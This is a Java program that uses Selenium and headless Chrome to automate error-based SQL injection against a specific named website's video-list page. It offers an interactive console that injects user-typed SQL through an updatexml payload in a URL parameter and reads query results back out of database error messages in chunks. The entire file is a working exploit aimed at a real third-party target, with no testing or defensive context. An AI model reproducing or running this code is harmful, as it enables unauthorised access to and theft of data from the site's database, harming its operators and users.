package me.zycracker.sqli;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.util.Scanner;

public class ZYAutoSQLInject {

    public static final Scanner scanner = new Scanner(System.in);
    public static WebDriver driver;

    public static void main(String[] args) {
        System.out.println("Tips: Use command 'quit' to quit the console");

        // Init Driver
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--headless --remote-allow-origins=*");
        driver = new ChromeDriver(options);
        System.out.println("Injecting SQL...");
        driver.get("https://www.opees.cn/qrz/VOD/vlist.aspx");

        while (true) {
            System.out.print("dbadmin_opees >> ");
            String command = scanner.nextLine();
            if (command.trim().equals("quit")) {
                quit(driver);
                return;
            }

            if (command.isEmpty()) continue;

            run(command.trim());
        }

    }

    public static void quit(WebDriver driver) {
        try {
            driver.get("about:blank");
            driver.quit();
        } catch (Exception ignored) {
        }
    }


    public static void run(String command) {
        command = "(" + command + ")";

        run(command, 0);
        String error = driver.findElements(By.xpath("*")).get(0).getText().split("\n")[1];
        if (!error.startsWith("XPATH")) {
            System.out.println(error);
            return;
        }

        int length = getLength(command);
        if (length > 30) {
            final int processCharInt = 20;
            for (int i = 0; i < length; i += processCharInt) {
                run(command, i);
                String tempData = getData();
                System.out.print(tempData.substring(0, Math.min(tempData.length(), processCharInt)));
            }
            System.out.print("\n");
            return;
        }

        run(command, 0);

        System.out.println(getData());
    }

    public static int getLength(String command) {
        run("length(" + command + ")", 0);
        return Integer.parseInt(getData());
    }

    public static void run(String command, int offset) {
        String url = "https://www.opees.cn/qrz/VOD/vlist.aspx?xk='+and+updatexml(1,concat(0x7e," +
                     (offset > 0 ? "substr(" : "") + command + (offset > 0 ? "," + offset + ")" : "") + "),1)+;+--+&xd='";
        driver.get(url);
    }

    public static String getData() {
        String error = driver.findElements(By.xpath("*")).get(0).getText().split("\n")[1];
        String data = error.substring(22);
        data = data.substring(0, data.length() - 1);
        return data;
    }
}
